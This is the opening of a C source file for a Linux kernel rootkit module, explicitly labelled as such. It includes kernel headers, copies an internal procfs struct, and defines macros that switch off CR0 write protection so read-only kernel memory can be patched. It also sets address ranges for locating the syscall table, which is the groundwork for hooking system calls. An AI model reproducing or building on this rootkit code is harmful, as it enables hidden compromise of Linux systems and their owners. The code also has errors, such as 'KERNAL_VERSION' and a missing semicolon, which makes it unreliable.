// a root kit main file

//imports
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNAL_VERSION(4, 4, 0) && \
	LINUX_VERSION_CODE < KERNAL_VERSION(4, 5, 0)

struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct rb_root subdir;
	struct rb_node subdrinode;
	void *data;
	atomic_t count;
	atomic_t in_use;

	struct completion *pde_unload_completion;
	struct list_head pde_openers;
	spinlock_t pde_unload_lock;
	u8 namelen;
	char name[];
};

#endif

#include "config.h"

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

MODULE_LICENSE("GPL");
MODULE_AUTHOR("krishpraanv")

#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
		"It should be easy to port to new architectures though"


#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#if defined __i386__
	#define START_ADDRESS 0xc0000000
	#define END_ADDRESS 0xd0000000
#elif defined __x86_64__
	#define START_ADDRESS 0xffffffff81000000
	#define END_ADDRESS 0xffffffffa2000000
#else
	#error ARCH_ERROR_MESSAGE
#endif

void **sys_call_table;
